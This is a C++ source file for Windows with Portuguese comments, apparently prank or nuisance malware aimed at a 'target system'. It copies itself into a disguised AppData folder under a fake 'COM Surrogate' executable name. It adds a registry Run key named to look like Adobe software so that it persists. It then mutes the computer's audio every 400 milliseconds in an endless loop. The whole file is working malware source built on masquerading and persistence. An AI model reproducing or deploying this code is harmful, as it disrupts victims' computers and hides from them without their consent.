//x86_64-w64-mingw32-g++ -std=c++17 SoundMute.cpp -lole32 -o COM_Surrogate_SourceSo.exe
#include <windows.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <iostream>
#include <chrono>
#include <thread>
#include <filesystem>
namespace fs = std::filesystem;

#pragma comment(lib, "Ole32.lib")

void permanece_job_diretory()
{
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    std::string path(exePath);

    size_t pos = path.find_last_of("\\/");
    if (pos != std::string::npos) {
        path = path.substr(0, pos);
    }
    SetCurrentDirectoryA(path.c_str());
}
std::wstring GetExecutableName()
{
    wchar_t buffer[MAX_PATH];
    GetModuleFileNameW(NULL, buffer, MAX_PATH);

    std::wstring fullPath(buffer);
    size_t pos = fullPath.find_last_of(L"\\/");

    if (pos != std::wstring::npos)
        return fullPath.substr(pos + 1);

    return fullPath;
}
void enchange_modules_files()
{

    // Obter username
    const char* user = std::getenv("USERNAME");
    if (!user) {
        return;
    }

    int len = MultiByteToWideChar(CP_UTF8, 0, user, -1, NULL, 0);
    std::wstring wuser(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, user, -1, &wuser[0], len);
    wuser.resize(wcslen(wuser.c_str()));

    // Diretorio base
    fs::path baseDir = fs::path(L"C:\\Users") / wuser / L"AppData\\Roaming\\Microsoft\\Survagate\\SysSound";

    //Arquivos necessario para enviar ao sistema alvo
    fs::path fileExecutable = GetExecutableName();
    fs::path exeDest = baseDir / fileExecutable;
    fs::path libsh1 = baseDir / "libgcc_s_seh-1.dll";
    fs::path libstdc6  = baseDir / "libstdc++-6.dll";

    // Criar diretorio
    try {
        fs::create_directories(baseDir);
    } catch (...) {
        return;
    }

    // Copiar arquivos necessario
    auto copy_if_not_exists = [&](const fs::path& src, const fs::path& dst) {
        try {
            if (!fs::exists(dst)) {
                fs::copy_file(src, dst);
            } else {
            }
        } catch (...) {
        }
    };

    copy_if_not_exists(fileExecutable, exeDest);
    copy_if_not_exists(L"libgcc_s_seh-1.dll", libsh1);
    copy_if_not_exists(L"libstdc++-6.dll", libstdc6);
    // Adicionar persistencia do programa ao sistema alvo (winreg) exe 1
    HKEY hKey;
    LPCWSTR subKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    std::wstring valueName = L"AdobeCommunity(Surgate)_Source";
    LPCWSTR data = exeDest.c_str();

    if (RegCreateKeyExW(HKEY_CURRENT_USER, subKey, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        if (RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ,
            reinterpret_cast<const BYTE*>(data),
            (lstrlenW(data) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
        } else {
        }

        RegCloseKey(hKey);
    } else {
    }

}
bool MuteSystemVolume(bool mute)
{
    HRESULT hr;

    // Inicializa COM
    hr = CoInitialize(NULL);
    if (FAILED(hr)) return false;

    IMMDeviceEnumerator* pEnumerator = NULL;
    IMMDevice* pDevice = NULL;
    IAudioEndpointVolume* pEndpointVolume = NULL;

    // Cria enumerador de dispositivos
    hr = CoCreateInstance(
        __uuidof(MMDeviceEnumerator),
        NULL,
        CLSCTX_INPROC_SERVER,
        __uuidof(IMMDeviceEnumerator),
        (void**)&pEnumerator);

    if (FAILED(hr)) return false;

    // Pega o dispositivo padrão de saída
    hr = pEnumerator->GetDefaultAudioEndpoint(
        eRender, eConsole, &pDevice);

    if (FAILED(hr)) return false;

    // Pega interface de controle de volume
    hr = pDevice->Activate(
        __uuidof(IAudioEndpointVolume),
        CLSCTX_INPROC_SERVER,
        NULL,
        (void**)&pEndpointVolume);

    if (FAILED(hr)) return false;

    // Muta ou desmuta
    hr = pEndpointVolume->SetMute(mute, NULL);

    // Libera
    pEndpointVolume->Release();
    pDevice->Release();
    pEnumerator->Release();
    CoUninitialize();

    return SUCCEEDED(hr);
}

int main()
{
    permanece_job_diretory();
    enchange_modules_files();

    while(true)
    {
        MuteSystemVolume(true);  // Bloqueia som
        std::this_thread::sleep_for(std::chrono::milliseconds(400));
    }
    //Sleep(3000);
    //MuteSystemVolume(false); // Desbloqueia som
}